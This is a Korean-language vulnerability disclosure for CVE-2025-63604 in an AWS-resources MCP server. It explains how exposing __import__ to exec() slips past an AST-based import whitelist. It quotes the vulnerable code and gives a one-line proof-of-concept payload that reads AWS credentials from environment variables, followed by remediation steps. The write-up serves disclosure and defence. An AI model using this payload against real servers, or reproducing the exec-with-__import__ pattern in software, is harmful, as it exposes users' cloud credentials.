---
title: CVE-2025-63604
#author: P0LESTAR
date: 2025-11-23 00:01:01 +0800
categories: [CVE]
tags: [CVE, MCP취약점]
#pin: true
sitemap:
  changefreq: monthly
  priority: 0.5
---

> 위 CVE는 K-Shield Jr. 프로젝트에서 발견한 취약점입니다.
{: .prompt-info }

## URL
<https://github.com/baryhuang/mcp-server-aws-resources-python>

<https://github.com/baryhuang/mcp-server-aws-resources-python/issues/8>

## Explain
boto3를 통해 모든 AWS 리소스를 쿼리하기 위해, 생성된 Python 코드를 실행하는 MCP서버입니다.

'mcp_server_aws_resources/server.py'에는 파이썬 코드를 실행하는 **execute_query** 메소드가 있습니다.

code injection을 막기 위해 import된 모듈을 white-list로 검증하는 코드가 있습니다.

```py
def execute_query(self, code_snippet: str) -> str:
    """
    Execute a boto3 code snippet and return the results

    Args:
        code_snippet (str): Python code using boto3 to query AWS resources

    Returns:
        str: JSON string containing the query results or error message
    """
    try:
        # Parse the code into an AST
        tree = ast.parse(code_snippet)

        # Analyze the code
        executor = CodeExecutor()
        executor.visit(tree)

        # Validate imports
        allowed_modules = {'boto3', 'operator', 'json', 'datetime', 'pytz', 'dateutil', 're', 'time'}
        unauthorized_imports = executor.imported_modules - allowed_modules
        if unauthorized_imports:
            return json.dumps({
                "error": f"Unauthorized imports: {', '.join(unauthorized_imports)}. "
                        f"Only {', '.join(allowed_modules)} are allowed."
            })

        # Create execution namespace
        local_ns = {
            'boto3': boto3,
            'session': self.session,
            'result': None,
            'itemgetter': itemgetter,
            '__builtins__': {
                name: getattr(__builtins__, name)
                for name in [
                    'dict', 'list', 'tuple', 'set', 'str', 'int', 'float', 'bool',
                    'len', 'max', 'min', 'sorted', 'filter', 'map', 'sum', 'any', 'all',
                    '__import__', 'hasattr', 'getattr', 'isinstance', 'print'
                ]
            }
        }

        # Compile and execute the code
        compiled_code = compile(tree, '<string>', 'exec')
        exec(compiled_code, local_ns)

    ...

```


>AST 파싱한 후 import된 모듈과 white-list를 비교하여 unauthorized_imports가 있다면 에러가 발생합니다.
{: .prompt-info }


## vulnerability
하지만 local_ns의 ``__builtin__``을 보면 `__import__`가 추가되어 있습니다.

```py
# Create execution namespace
local_ns = {
    ...
    '__builtins__': {
        name: getattr(__builtins__, name)
        for name in [
            ...
            '__import__', 'hasattr', 'getattr', 'isinstance', 'print'
        ]
    }
}

# Compile and execute the code
compiled_code = compile(tree, '<string>', 'exec')
exec(compiled_code, local_ns)
```
위에서 검증을 했기 때문에 `__import__`가 있어도 상관없는줄 알았지만, AST 파싱을 해보니 그렇지 않았습니다.

AST구조가 다르기 때문입니다.




### AST 파싱 노드

import os: "import 키워드 사용" → Import 노드

`__import__`('os'): "함수 이름이 __import__인 함수 호출" → Call 노드

```
import os: 
Module(body=[Import(names=[alias(name='os')])], type_ignores=[])

__import__('os'): 
Module(body=[Expr(value=Call(func=Name(id='__import__'), args=[Constant(value='os')], keywords=[]))], type_ignores=[])
```

>visit_Import()는 키워드 import를 사용한 구문만 감지하도록 설계되어서, 일반 함수 호출 형태인 `__import__`()는 감지하지 못합니다.
{: .prompt-warning }

## PoC
Code injection, os cmd injection이 가능합니다.
AWS 리소스를 다루는 MCP서버이므로, MCP사용을 위해 저장해놓은 사용자의 AWS 계정정보에 대해 접근이 가능합니다.

```py
result = {'aws_access_key': __import__('os').environ.get('AWS_ACCESS_KEY_ID', 'Not found'),\
 'aws_region': __import__('os').environ.get('AWS_DEFAULT_REGION', 'Not found')}
```

![Desktop View](assets\img\cve-2025-63604.png)

### Remediation
1. 취약한 파이썬 함수인 `exec()`을 지양합니다.
2. 위험한 내장 기능 제거하거나 white-list 검증을 강화합니다.